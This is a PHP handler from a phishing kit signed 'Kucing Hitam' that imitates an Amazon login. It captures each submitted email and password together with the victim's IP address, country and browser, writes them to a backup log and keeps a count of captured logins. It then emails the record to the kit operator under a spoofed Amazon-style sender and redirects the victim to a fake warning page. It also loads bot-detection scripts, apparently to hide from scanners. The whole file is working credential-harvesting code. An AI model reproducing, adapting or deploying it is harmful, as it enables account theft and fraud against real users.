<?php

/*
+-=[K]ucing[H]itam[S]hop=-+
*/

session_start();
$randomnumber = rand(1,100);

include('../__CONFIG__.php');
require('../detect.php');
require('../detek.php');

if (isset($_POST['Sex']))
{

	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PW'] = $_POST['PW'];

$message=
"[+] ========. [ $$ Kucing Hitam $$ ] .======= [+]

----------------Account Amazon--------------------
Account    : ".$_SESSION['EM']."|".$_SESSION['PW']."
Password   : ".$_SESSION['PW']."
--------------------PC Info-----------------------
IP         : ".$ip." | ".$nama_negara."
Browser    : ".$_SERVER['HTTP_USER_AGENT']."
[+] ========. [ $$ Silent Is Gold $$ ] .====== [+]
";
    $save = fopen("../../log/backup_login.txt", "a+");
    fwrite($save, $message);
    fclose($save);
    $file2 = "../../log/login.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
    $headers = "From: AKUN AMAZON  <amazon4-$randomnumber@kucinghitam.team>";
    $subject = "Amazon Login [ ".$ip." - ".$nama_negara."] ".$countryname." - [".$contin_name."]";
    mail($to, $subject, $message, $headers);

	header('Location: ../warning.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
  ?>